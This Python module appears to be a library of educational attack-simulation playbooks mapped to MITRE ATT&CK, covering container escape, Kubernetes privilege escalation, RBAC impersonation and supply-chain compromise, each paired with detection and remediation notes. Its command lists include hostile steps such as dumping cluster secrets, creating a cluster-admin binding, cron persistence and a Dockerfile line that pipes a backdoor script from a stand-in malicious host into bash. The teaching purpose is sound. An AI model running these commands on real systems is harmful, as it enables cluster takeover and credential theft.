"""
Attack Playbook Library

Collection of realistic attack scenarios aligned with MITRE ATT&CK framework.
Provides production-grade attack playbooks for educational threat simulation.
"""

from typing import Dict, List, Optional, Set
from dataclasses import dataclass, field
from enum import Enum
import json
import yaml


@dataclass
class AttackStep:
    """Individual step in an attack playbook."""
    name: str
    description: str
    step_type: str  # container_escape, privilege_escalation, etc.
    mitre_technique: str
    commands: List[str] = field(default_factory=list)
    expected_outcome: str = ""
    artifacts_created: List[str] = field(default_factory=list)
    delay_seconds: float = 2.0
    success_indicators: List[str] = field(default_factory=list)
    detection_methods: List[str] = field(default_factory=list)


@dataclass
class AttackPlaybook:
    """Complete attack playbook with multiple steps."""
    name: str
    description: str
    category: str
    difficulty_level: str  # beginner, intermediate, advanced
    mitre_techniques: List[str] = field(default_factory=list)
    steps: List[AttackStep] = field(default_factory=list)
    prerequisites: List[str] = field(default_factory=list)
    learning_objectives: List[str] = field(default_factory=list)
    educational_notes: List[str] = field(default_factory=list)
    remediation_steps: List[str] = field(default_factory=list)
    estimated_duration_minutes: int = 30


class PlaybookLibrary:
    """Repository of attack playbooks for educational simulation."""
    
    def __init__(self):
        self.playbooks: Dict[str, AttackPlaybook] = {}
        self._initialize_default_playbooks()
    
    def _initialize_default_playbooks(self):
        """Initialize the library with default attack playbooks."""
        
        # Container Escape Playbook
        container_escape = self._create_container_escape_playbook()
        self.playbooks[container_escape.name] = container_escape
        
        # Privilege Escalation Playbook
        privilege_escalation = self._create_privilege_escalation_playbook()
        self.playbooks[privilege_escalation.name] = privilege_escalation
        
        # RBAC Bypass Playbook
        rbac_bypass = self._create_rbac_bypass_playbook()
        self.playbooks[rbac_bypass.name] = rbac_bypass
        
        # Supply Chain Attack Playbook
        supply_chain = self._create_supply_chain_playbook()
        self.playbooks[supply_chain.name] = supply_chain
    
    def _create_container_escape_playbook(self) -> AttackPlaybook:
        """Create container escape attack playbook."""
        
        steps = [
            AttackStep(
                name="Environment Discovery",
                description="Discover container environment and capabilities",
                step_type="reconnaissance",
                mitre_technique="T1613",
                commands=[
                    "cat /proc/version",
                    "ls -la /dev/",
                    "mount | grep -E '(proc|sys|dev)'",
                    "ps aux"
                ],
                expected_outcome="Gather information about container runtime and host system",
                success_indicators=["Identify container runtime", "Locate host mount points"],
                detection_methods=["Process monitoring", "File access logging"]
            ),
            
            AttackStep(
                name="Privileged Container Check",
                description="Check if container is running with privileged access",
                step_type="privilege_check",
                mitre_technique="T1613",
                commands=[
                    "cat /proc/self/status | grep Cap",
                    "capsh --print",
                    "ls -la /dev/disk/",
                    "fdisk -l 2>/dev/null"
                ],
                expected_outcome="Determine if container has privileged capabilities",
                success_indicators=["CAP_SYS_ADMIN capability present", "Access to host devices"],
                detection_methods=["Capability monitoring", "Device access alerts"]
            ),
            
            AttackStep(
                name="Host Mount Exploitation",
                description="Exploit host filesystem mounts to escape container",
                step_type="container_escape",
                mitre_technique="T1611",
                commands=[
                    "find /host -name 'docker.sock' 2>/dev/null",
                    "chroot /host",
                    "echo 'ESCAPED' > /tmp/container_escape_proof.txt"
                ],
                expected_outcome="Successfully escape container and access host filesystem",
                artifacts_created=["/tmp/container_escape_proof.txt"],
                success_indicators=["chroot successful", "File created on host"],
                detection_methods=["chroot system calls", "Unauthorized file creation"],
                delay_seconds=5.0
            ),
            
            AttackStep(
                name="Host System Persistence",
                description="Establish persistence on the host system",
                step_type="persistence",
                mitre_technique="T1053",
                commands=[
                    "echo '* * * * * /bin/bash -c \"echo persistence >> /tmp/cron_proof.txt\"' | crontab -",
                    "systemctl --user enable --now malicious.service 2>/dev/null || true"
                ],
                expected_outcome="Establish persistence mechanisms on host",
                artifacts_created=["/tmp/cron_proof.txt"],
                success_indicators=["Cron job installed", "Service persistence established"],
                detection_methods=["Cron monitoring", "Service installation alerts"]
            )
        ]
        
        return AttackPlaybook(
            name="container_escape_privileged",
            description="Exploit privileged container to escape to host system",
            category="Container Security",
            difficulty_level="intermediate",
            mitre_techniques=["T1613", "T1611", "T1053"],
            steps=steps,
            prerequisites=[
                "Privileged container deployment",
                "Host filesystem mounted in container",
                "Docker socket accessible"
            ],
            learning_objectives=[
                "Understand container escape techniques",
                "Learn privileged container risks",
                "Practice host filesystem security",
                "Implement container hardening"
            ],
            educational_notes=[
                "Privileged containers have almost all host capabilities",
                "Host mounts provide direct filesystem access",
                "Container escapes can lead to full host compromise",
                "Defense requires proper container security contexts"
            ],
            remediation_steps=[
                "Remove privileged: true from container specs",
                "Use non-root users in containers",
                "Implement read-only root filesystems",
                "Apply security contexts and AppArmor/SELinux",
                "Limit host mounts to necessary read-only volumes"
            ],
            estimated_duration_minutes=25
        )
    
    def _create_privilege_escalation_playbook(self) -> AttackPlaybook:
        """Create Kubernetes privilege escalation playbook."""
        
        steps = [
            AttackStep(
                name="Service Account Discovery",
                description="Discover service account tokens and permissions",
                step_type="reconnaissance",
                mitre_technique="T1613",
                commands=[
                    "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
                    "kubectl auth can-i --list",
                    "kubectl get pods,services,secrets"
                ],
                expected_outcome="Enumerate current service account capabilities",
                success_indicators=["Service account token found", "Permissions enumerated"],
                detection_methods=["API server audit logs", "Unusual kubectl usage"]
            ),
            
            AttackStep(
                name="RBAC Misconfiguration Exploitation",
                description="Exploit overprivileged service account for escalation",
                step_type="privilege_escalation",
                mitre_technique="T1068",
                commands=[
                    "kubectl create clusterrolebinding malicious --clusterrole=cluster-admin --serviceaccount=default:default",
                    "kubectl get secrets -A",
                    "kubectl get nodes"
                ],
                expected_outcome="Escalate to cluster-admin privileges",
                success_indicators=["ClusterRoleBinding created", "Access to cluster secrets"],
                detection_methods=["RBAC change monitoring", "Privilege escalation alerts"]
            ),
            
            AttackStep(
                name="Credential Harvesting",
                description="Extract sensitive credentials and secrets",
                step_type="credential_access",
                mitre_technique="T1552",
                commands=[
                    "kubectl get secrets -A -o yaml > /tmp/all_secrets.yaml",
                    "grep -r 'password\\|key\\|token' /tmp/all_secrets.yaml",
                    "kubectl get configmaps -A -o yaml > /tmp/configmaps.yaml"
                ],
                expected_outcome="Harvest Kubernetes secrets and credentials",
                artifacts_created=["/tmp/all_secrets.yaml", "/tmp/configmaps.yaml"],
                success_indicators=["Secrets extracted", "Credentials obtained"],
                detection_methods=["Bulk secret access alerts", "Data exfiltration monitoring"]
            ),
            
            AttackStep(
                name="Lateral Movement Preparation",
                description="Prepare for lateral movement to other namespaces",
                step_type="lateral_movement",
                mitre_technique="T1021",
                commands=[
                    "kubectl get pods -A",
                    "kubectl exec -it <target-pod> -- /bin/bash",
                    "kubectl port-forward -n <namespace> <pod> 8080:8080"
                ],
                expected_outcome="Identify targets for lateral movement",
                success_indicators=["Cross-namespace access", "Pod execution capability"],
                detection_methods=["Cross-namespace activity", "Unusual exec commands"]
            )
        ]
        
        return AttackPlaybook(
            name="kubernetes_privilege_escalation",
            description="Escalate privileges in Kubernetes cluster through RBAC misconfigurations",
            category="Access Control",
            difficulty_level="advanced",
            mitre_techniques=["T1613", "T1068", "T1552", "T1021"],
            steps=steps,
            prerequisites=[
                "Access to Kubernetes cluster",
                "Overprivileged service account",
                "kubectl access"
            ],
            learning_objectives=[
                "Understand RBAC security implications",
                "Learn service account token usage",
                "Practice least-privilege principles",
                "Implement proper access controls"
            ],
            educational_notes=[
                "Default service accounts often have excessive permissions",
                "RBAC misconfigurations can lead to cluster compromise",
                "Service account tokens provide API access",
                "Proper RBAC requires principle of least privilege"
            ],
            remediation_steps=[
                "Implement least-privilege RBAC policies",
                "Disable default service account token mounting",
                "Use separate service accounts per application",
                "Enable admission controllers (PodSecurityPolicy/OPA)",
                "Regular RBAC auditing and review"
            ],
            estimated_duration_minutes=35
        )
    
    def _create_rbac_bypass_playbook(self) -> AttackPlaybook:
        """Create RBAC bypass attack playbook."""
        
        steps = [
            AttackStep(
                name="Permission Enumeration",
                description="Enumerate current permissions and restrictions",
                step_type="reconnaissance",
                mitre_technique="T1087",
                commands=[
                    "kubectl auth can-i '*' '*'",
                    "kubectl auth can-i --list --as=system:serviceaccount:default:default",
                    "kubectl get rolebindings,clusterrolebindings -A"
                ],
                expected_outcome="Map current permission boundaries",
                success_indicators=["Permission matrix created", "RBAC bindings identified"],
                detection_methods=["Authorization check logging", "Permission enumeration alerts"]
            ),
            
            AttackStep(
                name="Impersonation Attack",
                description="Attempt to impersonate higher-privileged users",
                step_type="privilege_escalation",
                mitre_technique="T1078",
                commands=[
                    "kubectl get pods --as=system:admin",
                    "kubectl get secrets -A --as=cluster-admin",
                    "kubectl create deployment malicious --image=alpine --as=system:serviceaccount:kube-system:default"
                ],
                expected_outcome="Successfully impersonate privileged accounts",
                success_indicators=["Impersonation successful", "Privileged resource access"],
                detection_methods=["Impersonation attempt logging", "Unusual user activity"]
            ),
            
            AttackStep(
                name="Resource Manipulation",
                description="Manipulate cluster resources to bypass restrictions",
                step_type="persistence",
                mitre_technique="T1078",
                commands=[
                    "kubectl patch deployment <target> -p '{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"<container>\",\"image\":\"malicious:latest\"}]}}}}'",
                    "kubectl create secret generic malicious-config --from-literal=password=compromised",
                    "kubectl label node <node> malicious=true"
                ],
                expected_outcome="Modify cluster state to maintain access",
                success_indicators=["Resource modifications successful", "Malicious configuration deployed"],
                detection_methods=["Resource change monitoring", "Unauthorized modifications alerts"]
            )
        ]
        
        return AttackPlaybook(
            name="rbac_bypass_impersonation",
            description="Bypass RBAC restrictions through user impersonation and resource manipulation",
            category="Access Control",
            difficulty_level="advanced",
            mitre_techniques=["T1087", "T1078"],
            steps=steps,
            prerequisites=[
                "Basic cluster access",
                "Impersonation permissions misconfigured",
                "kubectl access"
            ],
            learning_objectives=[
                "Understand impersonation attack vectors",
                "Learn RBAC bypass techniques",
                "Practice identity and access management",
                "Implement robust authorization controls"
            ],
            educational_notes=[
                "Impersonation can bypass intended access controls",
                "Resource manipulation can establish persistence",
                "Proper RBAC requires careful permission scoping",
                "Admission controllers provide additional protection"
            ],
            remediation_steps=[
                "Restrict impersonation permissions",
                "Implement admission controllers",
                "Enable comprehensive audit logging",
                "Regular access review and cleanup",
                "Use policy-as-code for RBAC management"
            ],
            estimated_duration_minutes=30
        )
    
    def _create_supply_chain_playbook(self) -> AttackPlaybook:
        """Create supply chain attack playbook."""
        
        steps = [
            AttackStep(
                name="Dependency Analysis",
                description="Analyze application dependencies for vulnerabilities",
                step_type="reconnaissance",
                mitre_technique="T1195",
                commands=[
                    "npm audit",
                    "pip list --outdated",
                    "docker history <image>",
                    "trivy image <image>"
                ],
                expected_outcome="Identify vulnerable dependencies",
                success_indicators=["Vulnerabilities found", "Outdated packages identified"],
                detection_methods=["Dependency scanning", "Vulnerability alerts"]
            ),
            
            AttackStep(
                name="Malicious Package Injection",
                description="Inject malicious code through compromised dependencies",
                step_type="initial_access",
                mitre_technique="T1195.002",
                commands=[
                    "echo 'console.log(\"Malicious code executed\");' >> node_modules/vulnerable-package/index.js",
                    "pip install malicious-package==1.0.0",
                    "docker build -t compromised:latest ."
                ],
                expected_outcome="Successfully inject malicious code",
                artifacts_created=["compromised:latest"],
                success_indicators=["Malicious code executed", "Package tampering successful"],
                detection_methods=["Package integrity monitoring", "Behavioral analysis"]
            ),
            
            AttackStep(
                name="Build Pipeline Compromise",
                description="Compromise CI/CD pipeline to inject malicious code",
                step_type="persistence",
                mitre_technique="T1554",
                commands=[
                    "git commit -m 'Update dependencies' --allow-empty",
                    "echo 'RUN curl -s http://malicious.com/backdoor.sh | bash' >> Dockerfile",
                    "kubectl apply -f malicious-deployment.yaml"
                ],
                expected_outcome="Compromise build and deployment process",
                success_indicators=["Pipeline modification successful", "Malicious deployment created"],
                detection_methods=["Pipeline monitoring", "Code review automation"]
            )
        ]
        
        return AttackPlaybook(
            name="supply_chain_compromise",
            description="Compromise application through supply chain attack vectors",
            category="Supply Chain Security",
            difficulty_level="intermediate",
            mitre_techniques=["T1195", "T1195.002", "T1554"],
            steps=steps,
            prerequisites=[
                "Access to application source code",
                "CI/CD pipeline access",
                "Package management systems"
            ],
            learning_objectives=[
                "Understand supply chain attack vectors",
                "Learn dependency security practices",
                "Practice secure build pipeline design",
                "Implement supply chain security controls"
            ],
            educational_notes=[
                "Supply chain attacks target trusted dependencies",
                "Build pipelines are critical attack vectors",
                "Dependency scanning is essential for security",
                "Software Bill of Materials (SBOM) provides visibility"
            ],
            remediation_steps=[
                "Implement dependency scanning and vulnerability management",
                "Use signed and verified container images",
                "Enable Software Bill of Materials (SBOM) generation",
                "Secure CI/CD pipelines with least privilege",
                "Implement container image signing and verification"
            ],
            estimated_duration_minutes=40
        )
    
    def get_playbook(self, name: str) -> Optional[AttackPlaybook]:
        """Get a playbook by name."""
        return self.playbooks.get(name)
    
    def list_playbooks(self) -> List[str]:
        """Get list of available playbook names."""
        return list(self.playbooks.keys())
    
    def get_playbooks_by_category(self, category: str) -> List[AttackPlaybook]:
        """Get playbooks filtered by category."""
        return [pb for pb in self.playbooks.values() if pb.category == category]
    
    def get_playbooks_by_difficulty(self, difficulty: str) -> List[AttackPlaybook]:
        """Get playbooks filtered by difficulty level."""
        return [pb for pb in self.playbooks.values() if pb.difficulty_level == difficulty]
    
    def get_mitre_techniques(self) -> Set[str]:
        """Get all MITRE ATT&CK techniques covered by playbooks."""
        techniques = set()
        for playbook in self.playbooks.values():
            techniques.update(playbook.mitre_techniques)
        return techniques
    
    def add_playbook(self, playbook: AttackPlaybook):
        """Add a new playbook to the library."""
        self.playbooks[playbook.name] = playbook
    
    def export_playbooks(self, format: str = "json") -> str:
        """Export playbooks in specified format."""
        if format == "json":
            return json.dumps(
                {name: playbook.__dict__ for name, playbook in self.playbooks.items()},
                indent=2,
                default=str
            )
        elif format == "yaml":
            return yaml.dump(
                {name: playbook.__dict__ for name, playbook in self.playbooks.items()},
                default_flow_style=False
            )
        else:
            raise ValueError(f"Unsupported format: {format}")
    
    def load_playbooks_from_file(self, filepath: str):
        """Load playbooks from external file."""
        with open(filepath, 'r') as f:
            if filepath.endswith('.json'):
                data = json.load(f)
            elif filepath.endswith('.yaml') or filepath.endswith('.yml'):
                data = yaml.safe_load(f)
            else:
                raise ValueError("Unsupported file format")
        
        for name, playbook_data in data.items():
            # Convert dict to AttackPlaybook object
            steps = [AttackStep(**step) for step in playbook_data.get('steps', [])]
            playbook_data['steps'] = steps
            playbook = AttackPlaybook(**playbook_data)
            self.playbooks[name] = playbook
